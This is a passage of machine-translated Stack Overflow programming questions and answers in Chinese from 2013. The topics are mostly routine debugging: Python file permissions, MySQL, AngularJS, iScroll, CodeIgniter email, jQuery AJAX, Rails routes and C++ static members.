File "<pyshell#2>", line 1, in <module>
     os.rename('C:\Windows\System32\C_950.NLS' , 'C:\Windows\System32\C_950.NLS')
WindowsError: [Error 5] Access is denied 
```

文件只是一个示例，我将更改自己的文件。我对计算机具有管理员控制权，但是我需要一种方法将其提供给没有管理员控制权的朋友。有没有半欺骗的方法来解决这个问题？还有一种方法可以通过 python 将命令发送到命令提示符吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:20:21.653

不回答主要问题，但要在系统上执行命令，您可以使用`os.system`，例如

```
>>> import os
>>> os.system('net use') 
```

# mysql - 如何通过 MYSQL 工作台授予对远程服务器上的数据库的 GRANT 权限？

> ID：15847256
> 
> 赞同：1
> 
> 时间：2013-04-06T05:11:43.043
> 
> 标签：mysql, heroku, mysql-workbench

我在 heroku 上有一个 cleadb 数据库。当我将我的数据库从本地磁盘上传到 heroku 时，它给出了错误

```
ERROR 1044 (42000) at line 1: Access denied for user 'user_name_of_cleardb_at_heroku'@'%' to database 'i_am_uploading' 
```

这是一些权限问题。如何授予我在 heroku 上的数据库的 GRANT RIGHTS 权限？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:16:35.540

您可能需要在 my.cnf 中注释掉 bind-address 行以允许来自 localhost 外部的连接：

```
#bind-address      = 127.0.0.1 
```

然后重新启动mysqld

# mysql - 如何检查子查询中的多个列？

> ID：15847258
> 
> 赞同：0
> 
> 时间：2013-04-06T05:12:51.843
> 
> 标签：mysql

我在 MySQL 中有几个表代表一个无向图。该`Users`表有一个`user_id`（以及我现在不需要的其他一些东西），而该`Links`表有一个`user_id_1`和`user_id_2`（以及我需要随身携带的一些其他数据）。我正在尝试获取给定用户的邻居（包括他自己）之间的所有链接。我的问题基本上是：我该怎么做？我设法通过以下有点不幸的查询获得了用户的所有邻居以及他自己：

```
SELECT u.* FROM Users u
JOIN Links l ON u.user_id = l.user_id_1
WHERE l.user_id_2 = @arg
UNION
SELECT u.* FROM Users u
JOIN Links l ON u.user_id = l.user_id_2
WHERE l.user_id_1 = @arg
UNION
SELECT * FROM Users
WHERE user_id = @arg 
```

现在我想准确地选择`Links`两者都`user_id_1`出现`user_id_2`在上述查询中的那些。**有没有办法在不执行该查询两次的情况下做到这一点？**因为（尽管我没有对其进行分析）我有这种偷偷摸摸的怀疑，即上述查询非常不高效。作为次要问题，是否有更好的方法来执行子查询？

编辑：已经被要求提供样本数据和输出，这里是。我给`Links`这里的桌子。我保证所有这些用户实际上都存在于`Users`表中，因此您无需担心连接失败或类似情况。但是我认为这个问题应该是可以回答的，根本不需要加入`Users`。

```
link_id  user_id_1  user_id_2
1        A          B
2        C          B
3        C          A
4        D          C
5        C          E
6        D          E
7        A          D
8        F          A 
```

如果我们然后对 A 执行此查询，则`Users`上面的查询应该返回除 E 之外的所有人，E 不是 A 的邻居（所有其他人都是）。我要查找的查询需要返回`Links`表中除 5 和 6 之外的所有涉及 E 的查询。特别是它需要返回 2 和 4，以及直接涉及 A 的链接。

# javascript - 将手柄从控制器输出到指令不具有约束力

> ID：15847259
> 
> 赞同：0
> 
> 时间：2013-04-06T05:12:56.903
> 
> 标签：javascript, angularjs

我有以下指令，在所有其他情况下都可以正常工作：

```
.directive('breadcrumbs', function() {
    return {
        restrict: "E",
        replace: true,
        template: '<ul class="breadcrumb offset2" ng-show="breadcrumbs">'
                +'<li ng-repeat="crumb in breadcrumbs">'
                    +'<span ng-hide="crumb[1]">{{crumb[0]}}</span>'
                    +'<a ng-show="crumb[1]" href="#{{crumb[1]}}">{{crumb[0]}}</a>'
                    +'<span ng-show="crumb[1]" class="divider">/</span>'
                +'</li>'
            +'</ul>'
    }
} 
```

它需要一个“面包屑”数组，每个面包屑都是一个包含 的数组`['title', 'href']`，例如：

```
$scope.breadcrumbs = [ ['Home', '/'], ['Projects', '/project'], ['Add', ''] ] 
```

如果`href`为空，则`ngShow`/`ngHide`组合以隐藏链接并仅输出文本。

当我想从面包屑中的控制器输出 $scope 变量时，就会出现问题，例如：

```
var ProjectViewCtrl = function ($scope, $routeParams, Project) {
    $scope.project = Project.get({id: $routeParams.id})
    $scope.breadcrumbs = [ ['Home', '/'], ['Projects', '/project'], ['{{project.name}}', ''] ]
} 
```

目的是`{{project.name}}`在面包屑的最后一个元素中输出，然后一旦`Project.get`完成，面包屑与控制器模板中的所有其他内容一起更新。不幸的是，这并没有发生，文本`{{project.name}}`被输出到页面并且永远不会更新。

我知道另一种方法是在`Project.get`成功回调中设置面包屑，但这不会真正具有约束力，我只是更新值，因此否定使用 Angular 的主要原因之一:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T20:07:44.197

请参考这个小提琴[http://jsfiddle.net/BJP3v/1/](http://jsfiddle.net/BJP3v/1/)。`ng-bind`用于将动态项目名称绑定到视图。

然后为了测试绑定是否有效，`test`在控制器范围内创建了一个方法。按下按钮时，项目名称会更新。请将项目名称的更新放在`$http`调用或`$resource`调用的回调中

# drupal-7 - 实体引用节点内容

> ID：15847261
> 
> 赞同：0
> 
> 时间：2013-04-06T05:13:09.557
> 
> 标签：drupal-7, drupal-views

我有两种内容类型 content-type1 和 content-type2。我在 content-type2 中使用了 content-type1 作为实体引用。

我在 content-type2 中有 50 个内容列表，在 contetn-type2 中有 5 个内容。现在从 content-type1 开始，每 10 个内容指的是 contet-type2 的不同节点。现在在 content-type2 的所有 5 个节点上，我想创建一个视图块，它应该显示引用该特定节点的 10 个内容的列表。

任何人都可以帮助我如何为这种行为使用上下文过滤器或关系？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T06:17:45.857

您需要在视图中创建 content-type1 的上下文引用，并将结果限制为该内容类型。

# cordova - 添加“iscroll”后输入字段无响应-PhoneGap

> ID：15847263
> 
> 赞同：1
> 
> 时间：2013-04-06T05:13:22.927
> 
> 标签：cordova, phonegap-plugins, iscroll

现在我正在做一个phonegap应用程序，我在我的项目中添加了'iscroll4'，因为我需要滚动页面，但不幸的是，在我添加'iscroll.js'之后，我的输入文本字段没有响应（我无法在textfeilds中输入任何内容）。我的代码如下所示：

```
<script type="text/javascript" src="cordova-2.2.0.js"></script>
    <script type="text/javascript" src="js/iscroll.js"></script>
    <script type="text/javascript">

    var myScroll;
    function loaded() 
    {
        document.addEventListener('touchmove', function(e){ e.preventDefault(); });
        myScroll = new iScroll('scroller');

    }
    document.addEventListener('DOMContentLoaded', loaded); 
```

我的滚动部分在下面的 div 下

```
 <div id="wrapper">
            <div id="scroller">
               //scrolling items..
           </div> 
     </div> 
```

我真的在为此苦苦挣扎，谁能帮助我..

提前致谢..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T05:25:08.397

在您启动滚动条的功能中

```
myScroll = new iScroll('scroller'); 
```

使用`onBeforeScrollStart : null`. 这意味着你的滚动启动应该是这样的

```
myScroll = new iScroll('scroller', { onBeforeScrollStart : null }); 
```

`onBeforeScrollStart`这是因为在 iScroller 插件中搜索功能，你可以找到

```
onBeforeScrollStart: function (e) { e.preventDefault(); } 
```

只需在鼠标按下时，它就会触发此功能并阻止其默认事件。所以你的输入元素变得无响应。

因此，当您在没有输入元素的情况下覆盖`onBeforeScrollStart`函数时，`e.preventDefault()`将变得响应。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-04T05:40:12.850

这对我有用...

```
function loaded() {
    testScroll = new iScroll('wrapper', {
        useTransform: false,
        bounce: false,
        onBeforeScrollStart: function (e) 
        {
            var target = e.target;
            while (target.nodeType != 1) {
                target = target.parentNode;
            }

            if (target.tagName != 'SELECT' && target.tagName != 'INPUT' && target.tagName != 'TEXTAREA' && target.tagName != 'OPTION') {
                e.preventDefault();
            }
        }
    });
}
setTimeout(function () { testScroll.refresh(); }, 200); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-03T10:09:35.423

试试这个工作

```
 var selectField = document.getElementById('txt_Field');
      selectField.addEventListener('touchstart', function(e)
      {
        e.stopPropagation();
      }, false); 
```

# css - 文本对齐：中心不居中文本

> ID：15847268
> 
> 赞同：0
> 
> 时间：2013-04-06T05:13:57.260
> 
> 标签：css

我想知道如何在此页面中将字形居中，它们是使用@font-face 的图标字体，但即使在我将 text-align:center 应用于包含每个字形的锚点之后，它们也不会居中。

它们显示为左对齐。

关于如何修复它们以使它们居中的任何想法？

我更喜欢不涉及 css3 的 flexbox 的解决方案。

这是页面：[https ://dl.dropbox.com/u/270523/help/initializr/index.html](https://dl.dropbox.com/u/270523/help/initializr/index.html)

另外，如果您可以将标题中的最后一行文本#navigationText 居中，我将不胜感激，因为这似乎也不居中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T05:35:49.413

只需`float:left`从`.nav ul li`. `text-align:center`将使所有`display:inline`浮动和不浮动的孩子居中。

```
.nav ul li {
    float: left;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:52:13.623

`display:inline-block;`在课堂上使用`.nav ul`...它会自动居中...

```
.nav ul {
    display: inline-block;
    list-style: none outside none;
    margin: 0;
    padding: 0;
} 
```

# iphone - 推送或弹出导航控制器 - IOS 时是否需要调整 UITableView 的大小？

> ID：15847271
> 
> 赞同：1
> 
> 时间：2013-04-06T05:14:05.227
> 
> 标签：iphone, ios, cocoa-touch, uitableview, uinavigationbar

大家可能会想，为什么我们需要在弹出视图时调整表格视图的大小。我有一个奇怪的问题，我有一个显示导航栏的表格视图，从那个视图我正在推送一个没有导航栏的新视图（即我正在隐藏它），当我弹出那个新视图时，我的表格视图高度正在降低，因为它当前显示了导航栏。

我花了很长时间才发现这是问题所在。任何有这样经历的人，在这种情况下我们是否需要调整视图大小或控件。

请检查附图，第一个是正常的...

![在此处输入图像描述](https://i.stack.imgur.com/Ji1yM.png)

第二个是在从没有导航栏的新视图中弹出之后......

![在此处输入图像描述](https://i.stack.imgur.com/B10Pl.png)

第 1 节中最后一行遗漏了，因为表格视图的高度降低了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T06:14:36.457

试试这个.....希望它会工作。将 UITableView 布局设置为完整视图。![在此处输入图像描述](https://i.stack.imgur.com/t83fm.png)

# java - 在 Android 中使用关键字搜索任何网页

> ID：15847273
> 
> 赞同：0
> 
> 时间：2013-04-06T05:14:08.230
> 
> 标签：java, android, search, web

我开发了一个应用程序..它将搜索用户在编辑文本中输入的关键字...该应用程序运行良好..但现在该应用程序仅在 Google 中搜索..我需要搜索用户提供的关键字..它应该在站点中搜索..例如：[http](http://www.java2s.com/Open-Source/Android/android-platform-apps/Browser/com/android/browser/search/DefaultSearchEngine.java.htm) ://www.java2s.com/Open-Source/Android/android-platform-apps/Browser/com/android/browser/search/DefaultSearchEngine.java.htm ..为此，我必须做些什么......我在下面给出代码......请帮助......`

```
btn.setOnClickListener(new View.OnClickListener()   
    {

        @Override
        public void onClick(View v)

        {
            // TODO Auto-generated method stub
             Editable searchText = ev.getText();
            Intent intent = new Intent(Intent.ACTION_WEB_SEARCH);
            intent.putExtra(SearchManager.QUERY, ev.getText().toString());                                                                                           
            startActivity(intent); 

        }
    });         ` 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T09:28:11.603

@ user2223317 .. 而不是使用 ACTION_WEB_SEARCH 尝试使用 ..ACTION_VIEW ...它会工作...尝试执行以下代码

```
`@Override
        public void onClick(View v)

        {
            // TODO Auto-generated method stub
             Editable searchText = ev.getText();
            Intent intent = new Intent(Intent.ACTION_VIEW,Uri.parse("http://stackoverflow.com/"));
            intent.putExtra(SearchManager.QUERY, ev.getText().toString()); 

            startActivity(intent); ` 
```

并且不要忘记接受我的回答..如果它有效...谢谢...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T05:42:54.160

在这种情况下，您需要编写自己的 SearchManager。您可以使用一个**[WebView](http://developer.android.com/reference/android/webkit/WebView.html)**编写一个，它需要两个参数“SITE_TO_BE_SEARCH”和“QUERY”。现在所有搜索都将在您的应用程序中执行，无需启动外部浏览器应用程序。寻找任何 WebView 示例应用程序，您会发现很多。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-02-15T12:13:35.947

可以使用相同的意图搜索任何关键字，但通过添加带有静态 url 的查询。像这样

```
 Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com/search?q=" + string));
 startActivity(intent); 
```

# codeigniter - Codeigniter 在 mamp 上发送电子邮件

> ID：15847276
> 
> 赞同：1
> 
> 时间：2013-04-06T05:14:54.837
> 
> 标签：codeigniter, mamp

我正在使用 codeigniter 及其电子邮件类尝试在 MAMP 上发送电子邮件（免费版）

我的代码如下

> $config = 数组（
> 
> ```
>  'protocol' => 'smtp',
>         'smtp_host' => 'ssl://smtp.googlemail.com',
>         'smtp_port' => 465,
>         'smtp_user' => 'test@gmail.com.sg',
>         'smtp_pass' => '*********',
>         'mailtype'  => 'html',
>         'starttls'  => true
>     );
> 
>     $this->load->library('email', $config);
>     $this->email->set_newline("\r\n");
>     
>     $this->email->from('test@gmail.com.sg', 'Jeffrey Way');
>     $this->email->to('test_to@gmail.com.sg');     
>     $this->email->subject('This is an email test');     
>     $this->email->message('It is working. Great!');
>     $this->email->send();   
>     echo $this->email->print_debugger(); 
> ```

但是我总是得到一个错误

> 220 mx.google.com ESMTP ri1sm17015935pbc.16 - gsmtp hello：250-mx.google.com 为您服务，[203.116.128.34] 250-SIZE 35882577 250-8BITMIME 250-AUTH LOGIN PLAIN XOAUTH XOAUTH2 250 ENHANCED
> 
> 验证密码失败。错误：535-5.7.1 不接受用户名和密码。如需了解详情，请访问 535 5.7.1 [http://support.google.com/mail/bin/answer.py?answer=14257](http://support.google.com/mail/bin/answer.py?answer=14257) ri1sm17015935pbc.16 - gsmtp 来自：530-5.5.1 需要身份验证。如需了解详情，请访问 530 5.5.1 [http://support.google.com/mail/bin/answer.py?answer=14257](http://support.google.com/mail/bin/answer.py?answer=14257) ri1sm17015935pbc.16 - gsmtp
> 
> 遇到以下 SMTP 错误：530-5.5.1 需要身份验证。如需了解详情，请访问 530 5.5.1 [http://support.google.com/mail/bin/answer.py?answer=14257](http://support.google.com/mail/bin/answer.py?answer=14257) ri1sm17015935pbc.16 - gsmtp 至：530-5.5.1 需要验证。如需了解详情，请访问 530 5.5.1 [http://support.google.com/mail/bin/answer.py?answer=14257](http://support.google.com/mail/bin/answer.py?answer=14257) ri1sm17015935pbc.16 - gsmtp

在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T11:45:28.963

```
Authentication Required. 
```

您使用的不是自己的 gmail 帐户（电子邮件和密码）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-12T18:29:09.080

我在很多地方都看到过这个问题，当然，我在这里是因为我有同样的问题。我认为发生的事情是，当 Jeffrey Way 编写教程时（[第 3 天](http://net.tutsplus.com/tutorials/php/codeigniter-from-scratch-day-3/)，正是我从哪里得到我的代码）在 2009 年，发送电子邮件的身份验证非常简单。我认为现在与谷歌不同。您必须使用 oauth2 身份验证流程。我已经设法为 CodeIgniter 找到了这样的代码，并且可以进行身份​​验证，但是我仍然不太明白身份验证后要做什么。我可能还不够努力，因为最近我一直在为 Google、Yahoo、Facebook、Twitter 和 Flickr 编写几个 oAuth2 身份验证脚本。我猜在您允许该应用访问您的 Google 信息后，回调页面就是您放置实际发送邮件代码（您在问题中的代码）的位置。所以，我认为这是一个两部分的过程：

1.  使用 oAuth2 向 Google 进行身份验证，以及
2.  您的端点是发送电子邮件的回调页面（上述示例代码来自 Way 教程）。

你只想简单地发送一封电子邮件，我意识到，我也是。但我认为你可能想要复制和粘贴并尝试这个工作脚本：

[在 codeigniter 中使用 google 帐户登录](https://stackoverflow.com/questions/14973402/login-with-google-account-in-codeigniter)

# node.js - 我可以使用什么节点模块在 Heroku 上实现时钟进程？

> ID：15847282
> 
> 赞同：7
> 
> 时间：2013-04-06T05:15:20.560
> 
> 标签：node.js, heroku

这是关于heroku上时钟节点进程的文章： [https ://devcenter.heroku.com/articles/scheduled-jobs-custom-clock-processes](https://devcenter.heroku.com/articles/scheduled-jobs-custom-clock-processes)

然而，那里没有提到时钟进程节点模块。有人知道节点的时钟处理模块吗？

# c# - 当两者相等时，数组的 C# 中的数据不匹配

> ID：15847283
> 
> 赞同：0
> 
> 时间：2013-04-06T05:15:22.723
> 
> 标签：c#, .net

我声明了一个数组

```
string[] arr1;
string[] arr2; 
```

在某一点上，我为此分配了价值

```
arr1 = new string[] { "value1" , "Value2 };
arr2 = arr1; 
```

之后我再次改变 arr1 的值

```
arr1[0]="value3";
arr1[1]="value4"; 
```

现在，如果我检查 arr2，arr1 中的这些变化也会反映出来。

```
arr2[0] value is "value3";
arr2[1] value is "value4"; 
```

它是怎么发生的？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-06T05:17:44.200

数组是 .NET 中的引用类型。当你这样做时，`arr2 = arr1`你让两个变量都指向内存中的同一个数组。对其中一个元素的任何更改都将直接反映在另一个中。

要制作数组的副本，请使用以下[`Array.Clone`](http://msdn.microsoft.com/en-us/library/system.array.clone.aspx)方法：

```
arr2 = (string[])arr1.Clone(); 
```

或 Linq 的[`Enumerable.ToArray`](http://msdn.microsoft.com/en-us/library/bb298736.aspx)方法：

```
arr2 = arr1.ToArray(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T05:18:48.267

因为`arr2`是引用`arr1`所以`arr2`是指向`arr1`内存中的。每一次改变`arr1`都会体现到`arr2`。

# excel - 在这种情况下如何使用 vlookup 命令

> ID：15847287
> 
> 赞同：0
> 
> 时间：2013-04-06T05:15:42.333
> 
> 标签：excel, excel-2007

vlookup 的语法

```
vlookup(value we are looking for, Data range, index, exact/aprrox. match) 
```

即`vlookup(A1,B1:E3,1,false)` vlookup 将在第一列中查找我们想要的值，该值位于单元格 A1 中。但如果具有相同的数据范围，我希望它在第三列中搜索我的值“A1”，它应该返回第一列中的值。

澄清我的问题的示例

```
 A      B      c     D    E
1    22    area    3     4    5
2          length  2     22   2
3          height  4     32   7 
```

在上述数据中，我希望 excel 在 D 列中搜索 A1，即“22”，并在 B 列中返回与它相反的值，即“长度”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T07:03:32.117

试试这个

```
=INDEX(B1:B3,MATCH(A1,D1:D3,0)) 
```

回应评论，`Index` `Match`横向使用：

假设你的数据是这样的

```
 A      B       C       D
1    22     area    length  height
2           3       2       4
3           4       22      32
4           5       2       7 
```

要获得与原始数据相同的结果，请使用

```
=INDEX(B1:D1,MATCH(A1,B3:D3,0)) 
```

# javascript - 在 MongoDB 中，如何搜索不存在的电子邮件，使我的整个应用程序崩溃

> ID：15847290
> 
> 赞同：1
> 
> 时间：2013-04-06T05:15:49.407
> 
> 标签：javascript, node.js, mongodb

在我的 Node.js express 应用程序中，我只是设置了一个用户登录，这是我第一次经历这种自学。

我这里有这个功能，

```
var db     = require('mongojs').connect('localhost/busapp', ['users']),
    crypto = require('crypto');

exports.new = function(req, res) {

    function User(email, password) {
        this.email = email;
        this.password = password;
    }

    var user = new User(req.body.user.email, req.body.user.password);
    console.log(user.email + user.password);

    db.users.find({'email':user.email}, function(err, userFound) {

        if (err) {
            console.log('We have an error :(');
        } else if (userFound === 'undefined') {
            console.log('We couldn\'t find the user ' + user.email);
            return;
        } else {
            console.log('We have fixed the error, hooorraayyy!! ' + userFound[0].email)
        } 
    });

} 
```

但控制台日志显示为

```
We found the user! undefined 
```

我不确定我做错了什么，如果有人能说明情况会很好，谢谢！

好的，所以我通过将我的代码更改为上面的代码来修复它，但现在我遇到了一个问题，如果我尝试搜索不存在的电子邮件，它会使我的整个应用程序崩溃并出现以下错误：

```
C:\Users\Gacnt\Desktop\Busapp\node_modules\mongojs\node_modules\mongodb\lib\mongodb\connection\server.js:529
        throw err;
              ^
TypeError: Cannot read property 'email' of undefined
    at C:\Users\Gacnt\Desktop\Busapp\routes\session.js:22:72
    at C:\Users\Gacnt\Desktop\Busapp\node_modules\mongojs\node_modules\mongodb\lib\mongodb\cursor.js:159:16
    at commandHandler (C:\Users\Gacnt\Desktop\Busapp\node_modules\mongojs\node_modules\mongodb\lib\mongodb\cursor.js:628
:16)
    at null.<anonymous> (C:\Users\Gacnt\Desktop\Busapp\node_modules\mongojs\node_modules\mongodb\lib\mongodb\db.js:1709:
18)
    at g (events.js:175:14)
    at EventEmitter.emit (events.js:106:17)
    at Server.Base._callHandler (C:\Users\Gacnt\Desktop\Busapp\node_modules\mongojs\node_modules\mongodb\lib\mongodb\con
nection\base.js:130:25)
    at C:\Users\Gacnt\Desktop\Busapp\node_modules\mongojs\node_modules\mongodb\lib\mongodb\connection\server.js:522:20
    at MongoReply.parseBody (C:\Users\Gacnt\Desktop\Busapp\node_modules\mongojs\node_modules\mongodb\lib\mongodb\respons
es\mongo_reply.js:132:5)
    at null.<anonymous> (C:\Users\Gacnt\Desktop\Busapp\node_modules\mongojs\node_modules\mongodb\lib\mongodb\connection\
server.js:481:22)
PS C:\Users\Gacnt\Desktop\Busapp> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:26:37.510

我从来没有使用过 mongo 的 javascript 驱动程序，但看起来你的查询本身是错误的。至于我，您的用户对象是 undefined ，它没有 email 属性。Mongo js 驱动程序甚至在它实际将查询传递给 mongo 引擎之前尝试解析此属性的值，这对于非现有用户来说会失败，所以你有一个异常。尝试在查询 mongo 之前添加检查用户对象是否正确。

顺便说一句，从您的代码片段中不清楚您在哪里打印消息“我们找到了一个用户！未定义'请仔细检查这个希望这有帮助

# javascript - 从 ajax 调用请求返回值的函数

> ID：15847292
> 
> 赞同：40
> 
> 时间：2013-04-06T05:15:53.327
> 
> 标签：javascript, jquery

我想要一个从 ajax 请求返回值的函数。我想停止 javascript 执行，直到函数获得由 ajax 异步请求返回的值。就像是：

```
function myFunction() {
    var data;
    $.ajax({
        url: 'url',
        data: 'data to send',
        success: function (resp) {
            data = resp;
        },
        error: function () {}
    }); // ajax asynchronus request 
    return data; // return data from the ajax request
} 
```

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2013-04-06T05:20:31.980

您需要注册一个回调函数，如下所示：

```
function test() {
    myFunction(function(d) {
        //processing the data
        console.log(d);
    });
}

function myFunction(callback) {
    var data;
    $.ajax({
        url: 'url',
        data: 'data to send',
        success: function (resp) {
            data = resp;
            callback(data);
        },
        error: function () {}
    }); // ajax asynchronus request 
    //the following line wouldn't work, since the function returns immediately
    //return data; // return data from the ajax request
} 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-04-06T05:20:35.923

Ajax 是异步的，这意味着调度了 ajax 调用，但您的代码会像以前一样继续运行而不会停止。在收到响应之前，Ajax 不会停止/暂停执行。您必须添加一个额外的回调函数或类似的东西。

```
 function myFunction() {
var data;
$.ajax({
    url: 'url',
    data: 'data to send',
    async: false,
    success: function (resp) {
        data = resp;
        callback.call(data);
    },
    error: function () {}
}); // ajax asynchronus request 
return data; // return data from the ajax request
  } 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-04-06T05:19:58.103

你需要做 asyn = False 像：

```
$.ajax({
    async: false,
    // ...
    success: function(jsonData) {
    //Your Logic
    }
}); 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2013-04-06T05:18:44.393

```
$.ajax({
        url: 'url',
        data: 'data to send',
        async: false,
        success: function (resp) {
            data = resp;
        },
        error: function () {}
    }); // ajax synchronus request 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2013-04-06T05:18:38.530

用于`async: false`您的 ajax 请求，因为 Ajax 是异步的。

将 async 设置为 false 意味着您正在调用的语句必须在函数中的下一条语句被调用之前完成。如果您设置 async: true 则该语句将开始执行，并且无论异步语句是否已完成都将调用下一条语句。

来自 jQuery[文档](http://api.jquery.com/jQuery.ajax/)：

> 默认情况下，所有请求都是异步发送的（即默认设置为true）。如果您需要同步请求，请将此选项设置为 false

# ruby-on-rails - Rails 中的简单搜索表单错误

> ID：15847295
> 
> 赞同：0
> 
> 时间：2013-04-06T05:16:26.437
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

我正在尝试实现一个简单的搜索表单，该表单在数据库中搜索其内容正在被搜索的关键字。

我的观点有这种形式：

```
<%= form_tag search_keywords_path, :method => 'get' do %>
    <%= text_field_tag :search, params[:search] %>
    <%= submit_tag "Search", :name => nil %>
<% end %> 
```

我的控制器有这些：

```
def search
    @keywords =  Keyword.search(params[:search])
end

def show
    @keyword = Keyword.find(params[:id])
    respond_to do |format|
    format.html # show.html.erb
    format.json { render json: @keyword }
    end
end 
```

模型关键字.rb：

```
def self.search(search)
    if search
    Rails.logger.debug("debug::Searching for" + search)
    @keyword = Keyword.find_all_by_content(search)
    end
end 
```

现在，每当我尝试运行搜索时，我都会收到此错误：

ActiveRecord::RecordNotFound in KeywordsController#show 找不到 id=search 的关键字

现在据我了解，有些东西弄乱了 show 方法，但我不明白为什么或如何解决它。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:45:35.743

在您的关键字.rb

代替

```
 @keyword = Keyword.find_all_by_content(search) 
```

和，

```
 @keyword = Keyword.find_all_by_content("#{search}") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:10:22.157

我认为你没有添加`search`行动路线。您可以按如下方式添加搜索路线：

```
resources :keywords do
  collection do
    get 'search'
  end
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T06:26:29.120

如果您想使用搜索功能，您需要以一种引发异常的方式使用 find()，即传递您要查找的 id。

```
 def show
        begin
          @keyword = Keyword.find(params[:id])
          respond_to do |format|
            format.html # show.html.erb
            format.json { render json: @keyword }
          end
        rescue ActiveRecord::RecordNotFound
           flash[:notice] = "Wrong keyword"
           redirect_to :action => 'index'
        end  
    end 
```

# php - 从 URL 中删除特定段

> ID：15847301
> 
> 赞同：-1
> 
> 时间：2013-04-06T05:16:54.390
> 
> 标签：php, codeigniter, codeigniter-url

我正在使用 codeigniter 2.xx，这是我的视图代码：

```
<a  href="users/user_info/<?=$row->user_name;?>/<?php echo $row->user_id;?>"></a> 
```

这是我的控制器代码：

```
function user_info($name, $id)
{   
    $info['info']       =   $this->user_model->user_info($id);
    $data['content']    =   $this->load->view('home',$info,true);
    $this->load->view('template',$data);
} 
```

当我点击链接时，我得到这个网址：`http://localhost/users/user_info/name/id`

我想删除最后一个 id 段，所以我的 url 变为：`http://localhost/users/user_info/name`。我怎样才能做到这一点？我阅读了有关 uri 段的信息，但它并没有解决我的问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:32:17.040

如果您尝试获取当前 URL 并从中删除 /id，只需：

```
$url = $_SERVER["REQUEST_URI"];

$paths = explode('/', trim(parse_url($url, PHP_URL_PATH), '/'));

unset($paths[count($paths)-1]);

$new_url = '/' . implode('/', $paths);

echo $new_url; 
```

删除最后一个 URL 段，`/users/user_info/name`如果访问页面则输出`/users/user_info/name/id`

或者，您可以将 $url 更改为 href="..." 中的字符串，但是您不能直接从 href 中删除代码吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:34:10.923

```
<a  href="/users/user_info/<?=$row->user_name;?>"></a> 
```

（在 href 添加斜线开始）和控制器..

```
function user_info($name)
{   
    $info['info']       =   $this->user_model->user_info($name);
    $data['content']    =   $this->load->view('home',$info,true);
    $this->load->view('template',$data);
} 
```

在您的用户模型设置函数 user_info 以通过用户名而不是用户 ID 捕获用户。你准备好了..

# c++ - 无法访问静态方法内的私有类成员？

> ID：15847307
> 
> 赞同：2
> 
> 时间：2013-04-06T05:18:13.893
> 
> 标签：c++, windows, class, methods, static

我有以下设置：

```
//.h
class Cell
{
private:
    POINT   mCellStartingPoint;
    int     mXoffset;
    int     mYoffset;
public:
    static void DrawRowOfPixels(int yoff);
    Cell();
    ~Cell();
};

//.cpp
void Cell::DrawRowOfPixels(int yoff)
{
    HDC dc = GetDC(NULL);
    COLORREF red = 0xFF0000;
    for(int i = mCellStartingPoint.x; i < mXoffset; i++)
    {
        SetPixel(dc, mCellStartingPoint.x + i, mCellStartingPoint + yoff, red);
    }
} 
```

但是，在 .cpp 文件中实现 DrawRowOfPixels() 方法时，Cell 类的所有成员变量都出现错误。（即 mCellStartingpoint、mXoffset 和 mYoffset）

> 错误 C2228：“.x”左侧必须有类/结构/联合
> 
> 错误 C2597：非法引用非静态成员 'Cell::mXoffset'
> 
> 错误 C3867：“Cell::mXoffset”：函数调用缺少参数列表；使用 '&Cell::mXoffset' 创建指向成员的指针
> 
> 错误：非静态成员引用必须相对于特定对象

我知道我可能在做一些非常愚蠢的事情，但是这里发生了什么？为什么我不能像我应该能够的那样在我的静态成员函数中使用我的私有成员变量？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-04-06T05:22:07.940

`static`除非您明确地使成员函数内的对象实例可用，否则您无法访问方法内的非静态成员。（将*对象实例显式传递为参数或使用可在函数内访问的全局实例*）

对于非静态成员函数，隐式`this`指针作为第一个参数传递给函数。`this`指针在成员函数内部被取消引用以访问成员。`static`成员不与隐式`this`指针一起传递，因此您无法访问函数内的非静态成员，除非您显式获取成员函数内的对象。

# python - 缩短 HTML 内容 python / django

> ID：15847315
> 
> 赞同：3
> 
> 时间：2013-04-06T05:19:44.037
> 
> 标签：python, html, django

我有一个从数据库中提取 HTML 内容的系统，它看起来像这样：

```
<p>This is some text</p>
<p>More text</p>
<p>Third Paragraph</p> 
```

并且在显示它时，它会显示博客文章内容的简短摘要，但是现在在显示文本时，我已将字符限制设置为 200 之类的数字，这将导致摘要如下所示：

```
<p>This is some text</p>
<p>More text</ 
```

